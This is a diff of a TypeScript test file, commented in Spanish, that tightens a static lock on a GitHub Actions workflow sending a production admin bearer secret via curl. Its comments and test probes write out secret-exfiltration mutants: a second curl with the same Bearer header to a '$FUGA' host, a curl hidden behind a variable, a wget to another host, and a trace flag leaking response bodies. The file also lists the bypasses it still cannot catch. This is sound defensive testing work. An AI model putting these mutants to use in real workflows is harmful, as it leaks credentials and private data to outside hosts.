@@ -23,19 +23,29 @@
 // de una vez y **NO ENVEJECE**"— eran FALSAS y estan corregidas: una lista de lo que se cubre no es
 // una prueba de que no haya nada mas.
 //
-// LO QUE SI CUBRE. Cada linea tiene al menos un mutante que MUERE, con el workflow correcto en verde
-// — los del fix-pack #3 (26 mutantes) estan en su reporte, los anteriores en los dos AR. La UNICA
-// excepcion, dicha: la no-regresion de `route.ts` (ultima linea) no tiene mutante propio, porque
-// mutar `route.ts` esta fuera del Scope IN de esta HU.
+// LO QUE SI CUBRE. Cada linea tiene al menos un mutante que MUERE, con el workflow correcto en verde.
+// ⚠️ DONDE ESTA ESA EVIDENCIA, Y QUE PARTE DE ELLA PODES ABRIR VOS. La tabla mutante-por-mutante vive
+// en `doc/sdd/042-*/auto-blindaje.md` y en los dos AR, y `.gitignore` ignora `doc/` COMPLETO: desde este
+// repo publico esos archivos NO SE PUEDEN ABRIR. Decirlo de otra forma seria mandarte a buscar algo que
+// no existe para vos —una version anterior de este parrafo citaba directamente "su reporte" del
+// fix-pack #3, y ese reporte no existe en ningun lado—. Lo que SI es verificable desde aca, en un
+// comando: los mutantes de la ultima ronda se corrieron contra el workflow cuyo
+// `md5sum .github/workflows/reconcile-orphans.yml` es `96a71a72993b995abe47a0e8192d9703`. Si no coincide con el
+// del arbol que estas leyendo, el `.yml` cambio despues de que se midio y esta lista hay que volver a
+// medirla.
+// La UNICA excepcion, dicha: la no-regresion de `route.ts` (ultima linea) no tiene mutante propio,
+// porque mutar `route.ts` esta fuera del Scope IN de esta HU.
 //   · Estructura: que exista `jobs.<job>.steps[i].run` —lo que GitHub lee— y no solo el texto. Un
 //     `jobss:`, un segundo job, o un paso convertido a `uses:` ponen T-042B-0 rojo.
 //   · Que los triggers sean EXACTAMENTE `schedule` + `workflow_dispatch`, y la cadencia sea la misma
 //     string en el YAML, el runbook y `.env.example` (fuente unica: el `cron:` del YAML).
 //   · Que el secreto viaje en un header, alimentado por `env:`, y NUNCA en la URL ni en texto plano.
 //   · Que el DESTINO del secreto este fijado: host y esquema cruzados con el `.yml`, el runbook y el
-//     arbol de la app (T-042B-15).
-//   · Que el argv del `curl` sea una LISTA BLANCA, en las dos direcciones (ninguna bandera de mas,
-//     ninguna obligatoria de menos).
+//     arbol de la app, Y que la comparacion corra ANTES del `curl` —no solo que exista en algun lugar
+//     del `run:`— (T-042B-15).
+//   · Que el argv de CADA `curl` que el paso invoque —no solo el primero— sea una LISTA BLANCA, en las
+//     dos direcciones (ninguna bandera de mas, ninguna obligatoria de menos), y que el VALOR del techo
+//     `--max-time` sea el mismo numero que declara el runbook, no solo que la bandera este.
 //   · Que cada anotacion `::error` vaya seguida de un corte `exit 1` **INCONDICIONAL EN SU NIVEL** —no
 //     "presente en el bloque"— y que no haya ningun `exit 0`.
 //   · Que ninguna de las nueve formas enumeradas de imprimir el cuerpo este en el shell, y que TODA
@@ -60,13 +70,27 @@
 //      el candado existe) y nada mira si el candado sigue teniendo dientes. Las sondas de calibracion
 //      de T-042B-8, T-042B-9, T-042B-15 y T-042B-16 acotan el riesgo (un lector roto se delata en su
 //      propia sonda) pero NO son un meta-test. Es un limite estructural, no un atajo.
+//      ⚠️ MEDIDO EN LOS DOS SENTIDOS, para no dejarlo en una afirmacion de memoria. LO QUE NO SE DELATA:
+//      borrar la asercion de ORDEN de la guarda de host, y borrar el cruce del techo `--max-time` con el
+//      runbook — los dos dejan la suite en 17/17, o sea que los dos arreglos de esta ronda se pueden
+//      revertir en silencio. LO QUE SI SE DELATA, porque hay una sonda que lo mira: volver
+//      `CURL_INVOCACION` al `/\bcurl\b/` ingenuo, o volver el lector a leer solo el PRIMER `curl`, ponen
+//      T-042B-15 ROJO. La diferencia entre las dos mitades es exactamente "¿hay una sonda que ejercite
+//      este lector?", y es la razon por la que cada lector de este archivo tiene la suya.
 //   4. LAS OTRAS VIAS DE LEER `body.json`. La lista blanca cubre `jq`; siguen pasando en verde
 //      `head -c 300 body.json`, `head -20 body.json >> "$GITHUB_STEP_SUMMARY"`, `$(cat < body.json)`,
-//      un `while read < body.json`, un `python3 -c` que imprima `['items']` y un `set -x`. Los seis
-//      publicarian IDs de remesas reales en un repo publico. Medidos uno por uno: cuatro en el AR it2,
-//      y dos (`head -c 300 body.json` y `set -x`) re-medidos en el fix-pack #3, donde SOBREVIVEN a
-//      proposito — un limite declarado que nadie volvio a medir es un limite que puede haberse cerrado
-//      o agrandado sin que nadie se enterara.
+//      un `while read < body.json`, un `python3 -c` que imprima `['items']` y un `set -x`. Medidos uno
+//      por uno: cuatro en el AR it2, y dos (`head -c 300 body.json` y `set -x`) re-medidos en el
+//      fix-pack #3, donde SOBREVIVEN a proposito — un limite declarado que nadie volvio a medir es un
+//      limite que puede haberse cerrado o agrandado sin que nadie se enterara.
+//      ⚠️ CINCO de los seis publican el archivo; el `set -x` NO, y decir "los seis" era FALSO. Medido con
+//      un `body.json` con IDs marcados: `head -c 300 body.json` ⇒ el ID marcado aparece en el log;
+//      `set -x` ⇒ CERO apariciones del ID y CERO de `items`, porque xtrace ecoa el COMANDO y las cinco
+//      asignaciones de agregados, nunca el contenido del archivo (es lo que dice, bien, el comentario de
+//      T-042B-10, 700 lineas mas abajo: las dos frases se contradecian en el mismo archivo). La direccion
+//      del error era conservadora —asustaba mas de lo que corresponde— y aun asi hay que corregirla: un
+//      perimetro que exagera un item pierde autoridad sobre los otros cinco, que son ciertos. El que hay
+//      que mirar de los seis es `head -c 300 body.json`.
 //   5. LA DIRECCION ESPEJO DEL INVARIANTE: verifica **anotacion ⇒ corte** y NADA verifica
 //      **corte ⇒ anotacion**. Es deliberado, y su consecuencia esta escrita: `jq -r` sobre un cuerpo
 //      que no es JSON sale **5**, asi que un 200 con una pagina de error HTML del CDN mata L2 por
@@ -84,6 +108,24 @@
 //   8. QUE EL WORKFLOW HAGA LO QUE DICE. Un `sed` que reescriba el YAML con otra sintaxis igualmente
 //      valida lo pasa en verde. Es un candado ANTI-REGRESION sobre el texto, no una prueba de
 //      funcionamiento.
+//   9. EL ORDEN DEL RESTO DEL SCRIPT, Y CUALQUIER COMANDO QUE NO SEA `curl`. Este item existe porque el
+//      CR encontro que los items 1..8 se leian como lista CERRADA y le faltaba justo la clase mas grave:
+//      el secreto saliendo a otro host. Los dos inputs que midio —la validacion de host movida a DESPUES
+//      del `curl`, y un SEGUNDO `curl` con el mismo header apuntando a otro dominio— pasaban 17/17 EN
+//      VERDE y ahora los dos MUEREN (T-042B-15, con calibracion en las dos direcciones). Lo que queda
+//      afuera, con su input medido:
+//      (a) EL ORDEN SE VERIFICA PARA DOS COSAS Y NADA MAS: el chequeo de secreto vacio (T-042B-8) y la
+//          comparacion de host (T-042B-15), las dos contra el `curl`. Reordenar cualquier otra cosa pasa
+//          en verde — medido: mover el bloque que escribe el resumen a ANTES de las cinco lecturas de
+//          agregados ROMPE el paso (las variables no existen todavia y `set -u` lo mata) y la suite queda
+//          en 17/17.
+//      (b) UN `curl` QUE NO ESTE EN POSICION DE COMANDO NO LO VE NADIE, y ningun otro programa que mande
+//          datos afuera tampoco. Medidos, los dos SOBREVIVEN en verde: `c=curl` y despues
+//          `$c -sS -X POST -H "authorization: Bearer <la env>" "$fuga"` (el comando detras de una
+//          variable; lo mismo valdria un `eval`, un `xargs` o un `sh -c`), y un `wget --header=…` contra
+//          otro host. Lo que cerraria esta familia es el mismo instrumento del item 4: LISTA BLANCA DEL
+//          PRIMER TOKEN DE CADA LINEA del `run:`, no lista negra de nombres de programas. Es una HU, no un
+//          fix-pack, y hasta que exista lo unico que lo caza es que alguien LEA el diff.
 //
 // ⚠️ TRAMPA RESUELTA A PROPOSITO, Y EN LOS DOS SENTIDOS — LOS COMENTARIOS NO SON CONFIGURACION. El
 // encabezado del workflow EXPLICA por que no tiene trigger `pull_request`, asi que esa palabra aparece
@@ -100,12 +142,18 @@
 //   · `CODIGO` = todo lo que cuelga de `jobs:`, sin comentarios de linea completa NI en linea —
 //     incluye configuracion (`env:`, `name:`, `with:`). Va aca lo que puede vivir fuera del `run:`,
 //     como un `Bearer` en texto plano.
-//   · `YAML` crudo lo tocan SOLO tres cosas, y a proposito: el `name:` del workflow, el `cron:` y el
-//     conteo de lineas de T-042B-0.
+//   · `YAML` crudo lo tocan SOLO cuatro cosas, y a proposito: el `name:` del workflow, el `cron:`, el
+//     conteo de lineas de T-042B-0 y el `timeout-minutes:` de T-042B-11. (Decia "tres" y eran cuatro: el
+//     cuarto se escribio despues y la enumeracion no se actualizo. La REGLA se respetaba —un comentario
+//     no satisface `/^\s+timeout-minutes:\s*\d+/m`, medido: comentar la linea MATA T-042B-11— pero en un
+//     archivo cuyo valor entero es que sus enumeraciones sean confiables, una enumeracion vieja es de la
+//     misma clase que las frases falsas que ya se corrigieron arriba.)
 // La eleccion entre los tres NO es estilistica: `CODIGO` en lugar de `SHELL` produjo el 4to falso rojo
 // de esta serie (un `name:` de paso con la palabra `jq`), y `YAML` en lugar de `CODIGO` produjo los
-// tres primeros. Es la misma leccion que la trampa 3 de no-evm-surface.test.ts, y la que quedo escrita
-// en doc/sdd/042-*/auto-blindaje.md.
+// tres primeros. Es la misma leccion que la trampa 3 de no-evm-surface.test.ts —ese archivo SI esta en el
+// repo y se puede abrir— y quedo escrita tambien en `doc/sdd/042-*/auto-blindaje.md`, que `.gitignore` NO
+// publica: si estas leyendo esto desde el repo publico, ese segundo puntero no te sirve, y el que si te
+// sirve es no-evm-surface.test.ts.
 //
 // ⚠️ POR QUE NO HAY BARRIDO DE DIRECTORIOS ACA. Este archivo lee CINCO rutas fijas. No recorre
 // ningun arbol, asi que no puede auto-dispararse con los literales que persigue (`.items`,
@@ -466,28 +514,53 @@ function tokens(cmd: string): readonly string[] {
   return out;
 }
 
-/** El argv del `curl` de un `run:`, con las lineas de continuacion (`\`) ya unidas y sin el
- *  `if ! code="$(` de adelante ni el `)"; then` de atras. Devuelve [] si no hay ningun `curl`.
+/** Una linea que INVOCA `curl`, y no una que lo MENCIONA.
+ *
+ *  🔴 POR QUE NO ES `/\bcurl\b/` A SECAS, y por que importa en las DOS direcciones. Este mismo workflow
+ *  tiene la palabra `curl` dentro del mensaje de un `::error` ("el curl no completo"), asi que un barrido
+ *  de toda linea que la mencione daria FALSO ROJO con el workflow CORRECTO — y un falso rojo con el
+ *  workflow bien es lo que empuja a alguien a RELAJAR el patron. Asi que se exige POSICION DE COMANDO:
+ *  principio de linea, o detras de un `$(`, un backtick, un `|`, un `;`, un `&`, un `(` o un `{`.
+ *
+ *  ⚠️ EL BORDE, declarado: un mensaje que contenga `; curl` o `(curl` se contaria como invocacion ⇒ falso
+ *  ROJO, que es la direccion VISIBLE del error. Y al reves, un `curl` escondido detras de una variable
+ *  (`c=curl; $c …`), de un `eval` o de un `sh -c` NO se cuenta: eso es el item 9(b) del perimetro, con su
+ *  input medido, y lo cerraria la lista blanca del primer token de cada linea. */
+const CURL_INVOCACION = /(?:^|\$\(|[;&|(`{])\s*!?\s*curl\b/;
+
+/** El argv de CADA `curl` que un `run:` invoca, uno por invocacion, con las lineas de continuacion (`\`)
+ *  ya unidas y sin el `if ! code="$(` de adelante ni el `)"; then` de atras. Devuelve [] si no hay ninguno.
  *
  *  🔴 POR QUE HACE FALTA EL ARGV Y NO ALCANZA CON REGEX DE PRESENCIA. El AR de la iteracion 2 midio
  *  dos banderas que el candado no podia ver, las dos con 15/15: `--trace-ascii /dev/stdout` volcaba el
  *  intercambio HTTP COMPLETO —cuerpo incluido, o sea los IDs de remesas reales— al log de un repo
  *  publico SIN TOCAR `body.json` (asi que ninguna asercion sobre `body.json` lo alcanzaba); y borrar
  *  `--max-time 60` subia el techo de 60 s a los 5 min del `timeout-minutes`. Tres rondas de lista
- *  negra son la evidencia de que la lista negra no cierra: lo que cierra es enumerar lo PERMITIDO. */
-function argvDelCurl(run: string): readonly string[] {
+ *  negra son la evidencia de que la lista negra no cierra: lo que cierra es enumerar lo PERMITIDO.
+ *
+ *  🔴 Y POR QUE TODAS LAS INVOCACIONES Y NO LA PRIMERA. Esta funcion usaba `findIndex`, o sea leia SOLO
+ *  el primer `curl`, y su nombre en singular ayudaba a no notarlo. Medido por el CR: agregar al paso un
+ *  SEGUNDO comando —`curl -sS -X POST -H "authorization: Bearer <la misma env>" "$fuga"`, con el destino
+ *  partido en dos literales para que `URL_RE` no lo viera— mandaba el secreto de administracion de
+ *  produccion a otro host y pasaba 17/17 EN VERDE. Una lista blanca que corre sobre "el primer curl" no
+ *  es una lista blanca: corre sobre CADA UNO. */
+function argvsDelCurl(run: string): readonly (readonly string[])[] {
   const lineas = run.split("\n");
-  const i = lineas.findIndex((l) => /\bcurl\b/.test(l));
-  if (i === -1) return [];
-  let texto = lineas[i] as string;
-  let j = i;
-  while (/\\\s*$/.test(lineas[j] as string) && j + 1 < lineas.length) {
-    j++;
-    texto = `${texto.replace(/\\\s*$/, "")} ${(lineas[j] as string).trim()}`;
+  const out: (readonly string[])[] = [];
+  for (let i = 0; i < lineas.length; i++) {
+    if (!CURL_INVOCACION.test(lineas[i] as string)) continue;
+    let texto = lineas[i] as string;
+    let j = i;
+    while (/\\\s*$/.test(lineas[j] as string) && j + 1 < lineas.length) {
+      j++;
+      texto = `${texto.replace(/\\\s*$/, "")} ${(lineas[j] as string).trim()}`;
+    }
+    const desde = texto.indexOf("curl");
+    const cierre = texto.lastIndexOf(')"');
+    out.push(tokens(cierre > desde ? texto.slice(desde, cierre) : texto.slice(desde)));
+    i = j;
   }
-  const desde = texto.indexOf("curl");
-  const cierre = texto.lastIndexOf(')"');
-  return tokens(cierre > desde ? texto.slice(desde, cierre) : texto.slice(desde));
+  return out;
 }
 
 /** El `cron:` del YAML es la FUENTE UNICA de la cadencia. No se hardcodea en este archivo a
@@ -851,8 +924,10 @@ describe("WKH-328B — candado estatico del workflow que invoca reconcile-orphan
     const VAR_URL = `$${"{RECONCILE_URL}"}`;
     const HEADER = `authorization: Bearer ${VAR_SECRETO}`;
 
-    const argv = argvDelCurl(L1);
-    expect(argv, "L1 no tiene ningun `curl`").not.toEqual([]);
+    const argvs = argvsDelCurl(L1);
+    expect(argvs, "L1 no tiene ningun `curl`").not.toEqual([]);
+    // El `curl` que manda el POST es el primero; la direccion de los OBLIGATORIOS va contra ese.
+    const argv = argvs[0] as readonly string[];
 
     // 🔴 LISTA BLANCA DEL ARGV. Cualquier token que no este enumerado es rojo. `--trace-ascii
     // /dev/stdout` —que publica el cuerpo entero en el log de un repo publico sin tocar `body.json`—
@@ -873,9 +948,17 @@ describe("WKH-328B — candado estatico del workflow que invoca reconcile-orphan
       "%{http_code}",
       VAR_URL,
     ];
-    for (const t of argv) {
-      const permitido = ARGV_PERMITIDO.some((p) => (typeof p === "string" ? p === t : p.test(t)));
-      expect(permitido, `bandera del curl que no esta en la lista blanca del candado: '${t}'`).toBe(true);
+    // 🔴 SOBRE CADA INVOCACION, no sobre la primera. Es el agujero que midio el CR: un SEGUNDO `curl` con
+    // el mismo `authorization: Bearer` apuntando a otro host pasaba 17/17 en verde, porque el lector hacia
+    // `findIndex`. Un token que no este enumerado es rojo, venga del `curl` que sea.
+    for (const [k, uno] of argvs.entries()) {
+      for (const t of uno) {
+        const permitido = ARGV_PERMITIDO.some((p) => (typeof p === "string" ? p === t : p.test(t)));
+        expect(
+          permitido,
+          `token del curl #${k + 1} de L1 que no esta en la lista blanca del candado: '${t}'`,
+        ).toBe(true);
+      }
     }
     // Y LA OTRA DIRECCION: la lista blanca sola no impide BORRAR una bandera necesaria. Medido: sin
     // `--max-time 60` el techo del curl pasa de 60 s a los 5 min del `timeout-minutes`, y el runbook
@@ -883,6 +966,25 @@ describe("WKH-328B — candado estatico del workflow que invoca reconcile-orphan
     for (const req of ["-sS", "-X", "POST", "--max-time", "-H", HEADER, "-o", "body.json", "-w", "%{http_code}", VAR_URL]) {
       expect(argv, `al curl le falta un argumento obligatorio: ${req}`).toContain(req);
     }
+    // 🔴 EL VALOR DEL TECHO, NO SOLO LA BANDERA — y cruzado con el runbook, igual que el host. Medido por
+    // el CR: `--max-time 60` → `600` SOBREVIVIA en verde, porque la lista blanca acepta `/^[0-9]+$/`
+    // (cualquier entero) y la direccion de los obligatorios exige el FLAG, no el valor. Y el runbook
+    // afirmaba que "el `--max-time 60` no es solo una afirmacion de este documento: el candado corre una
+    // lista blanca", que era FALSO: el candado respaldaba la bandera y el numero quedaba libre. Con esto,
+    // subir el techo sin tocar el runbook pone la suite roja — y borrar el VALOR dejando la bandera
+    // tambien (medido: `--max-time` sin numero tambien sobrevivia).
+    // ⚠️ EL NUMERO NO SE HARDCODEA ACA A PROPOSITO. Escrito en este archivo serian dos copias de lo mismo
+    // y el cruce con el runbook seguiria abierto. Se DERIVA del argv y se exige que el runbook —otro
+    // archivo, que lee un humano— declare el mismo: subir el techo obliga a tocar los dos, que es
+    // exactamente lo que se quiere que se revise. Es el mismo patron que el del host.
+    // ⚠️ Y EL `\b` NO ES DECORATIVO, medido: sin el, un techo de `6` matchearia DENTRO del `--max-time 60`
+    // del runbook y ese mutante sobreviviria.
+    const techo = argv[argv.indexOf("--max-time") + 1] ?? "";
+    expect(techo, "no se pudo derivar el valor de `--max-time` del argv del curl").toMatch(/^[0-9]+$/);
+    expect(
+      new RegExp(`--max-time ${techo}\\b`).test(RUNBOOK),
+      `el runbook no declara el techo del curl: falta \`--max-time ${techo}\``,
+    ).toBe(true);
 
     // ⚠️ CALIBRACION DEL LECTOR, EN LAS DOS DIRECCIONES. Sin esto, un `argvDelCurl` con un bug propio
     // (devolver [] o perder los tokens) haria que las dos listas de arriba aplaudan sobre nada.
@@ -894,9 +996,24 @@ describe("WKH-328B — candado estatico del workflow que invoca reconcile-orphan
       "body.json",
     ]);
     expect(
-      argvDelCurl('if ! code="$(curl -sS --trace-ascii /dev/stdout \\\n            "$U")"; then'),
+      argvsDelCurl('if ! code="$(curl -sS --trace-ascii /dev/stdout \\\n            "$U")"; then')[0] ?? [],
       "la sonda negativa: si el lector no ve la bandera, la lista blanca no protege nada",
     ).toContain("--trace-ascii");
+    // ⚠️ CALIBRACION DEL BARRIDO DE INVOCACIONES, EN LAS DOS DIRECCIONES. Es el arreglo de esta ronda, y
+    // las dos sondas son el par exacto que hay que fijar:
+    //   · que vea el SEGUNDO `curl` (con `findIndex` no lo veia, y el secreto salia a otro host en verde);
+    //   · y que NO cuente la palabra `curl` dentro de un mensaje `::error`. Ese mensaje EXISTE en este
+    //     workflow ("el curl no completo"), asi que contarlo seria un falso ROJO con el .yml correcto.
+    expect(
+      argvsDelCurl('curl -sS "$A"\ncurl -sS -H "authorization: Bearer $S" "$FUGA"'),
+      "el lector tiene que ver TODAS las invocaciones de `curl`, no la primera",
+    ).toHaveLength(2);
+    expect(
+      argvsDelCurl(
+        '          echo "::error title=transporte (L1)::el curl -sS --trace-ascii /dev/stdout no completo (timeout de 60s)"',
+      ),
+      "un `curl` MENCIONADO en un mensaje no es una invocacion: contarlo pone la suite roja con el workflow correcto",
+    ).toEqual([]);
 
     // 🔴 EL DESTINO, CRUZADO CON DOS FUENTES INDEPENDIENTES DEL PROPIO CURL. Medido por el AR: cambiar
     // el host de la URL a otro dominio —una edicion de UN renglon— mandaba el
@@ -919,6 +1036,28 @@ describe("WKH-328B — candado estatico del workflow que invoca reconcile-orphan
     expect(L1, "el workflow no compara el host contra HOST_PERMITIDO antes del curl").toMatch(
       /"\$\{host\}"\s*!=\s*"\$\{HOST_PERMITIDO\}"/,
     );
+    // 🔴 Y EL ORDEN, QUE ES LO QUE HACE QUE LA GUARDA SIRVA. Es el hallazgo del CR de esta ronda: con
+    // exigir solo que el literal y la comparacion EXISTIERAN —en cualquier lugar del `run:`— mover el
+    // bloque `esquema=` … `fi` a DESPUES del `curl` pasaba 17/17 EN VERDE. Y en ese .yml el
+    // `authorization: Bearer <el secreto de administracion de produccion>` YA SALIO cuando el paso imprime
+    // "El secreto de administracion NO se envio": la anotacion se vuelve una afirmacion FALSA emitida por
+    // el propio workflow. La forma es la misma que la del chequeo de secreto vacio en T-042B-8
+    // (`indexOf("-z ") < indexOf("curl")`), que existia para la guarda hermana y no para esta.
+    // ⚠️ VA SOBRE LA COMPARACION Y NO SOBRE EL LITERAL `HOST_PERMITIDO="…"`, y no es un detalle de estilo:
+    // medido, el mutante deja la ASIGNACION donde estaba y mueve solo las lineas de la comparacion, asi
+    // que un `indexOf('HOST_PERMITIDO="…"') < indexOf("curl")` lo habria aprobado igual.
+    // ⚠️ Y EL `curl` SE UBICA POR POSICION DE COMANDO (`CURL_INVOCACION`), no con `indexOf("curl")`: el
+    // mensaje del `::error` de transporte contiene la palabra `curl`, asi que con `indexOf` alcanzaria con
+    // mencionarla mas arriba para que la comparacion pareciera "antes del curl".
+    const lineasL1 = L1.split("\n");
+    const iGuarda = lineasL1.findIndex((l) => /"\$\{host\}"\s*!=\s*"\$\{HOST_PERMITIDO\}"/.test(l));
+    const iCurl = lineasL1.findIndex((l) => CURL_INVOCACION.test(l));
+    expect(iGuarda, "no se encontro la comparacion de host en ninguna linea de L1").toBeGreaterThan(-1);
+    expect(iCurl, "no se encontro ninguna INVOCACION de curl en L1").toBeGreaterThan(-1);
+    expect(
+      iGuarda,
+      "la comparacion del host corre DESPUES del curl: cuando el paso dice que el secreto no se envio, ya salio",
+    ).toBeLessThan(iCurl);
     // 2. y el runbook —otro archivo, que un humano lee— declara el MISMO host. Cambiar el destino de
     //    verdad exige tocar los dos archivos, que es exactamente lo que se quiere que se revise.
     expect(RUNBOOK.includes(host), `el runbook no declara el host de destino ${host}`).toBe(true);
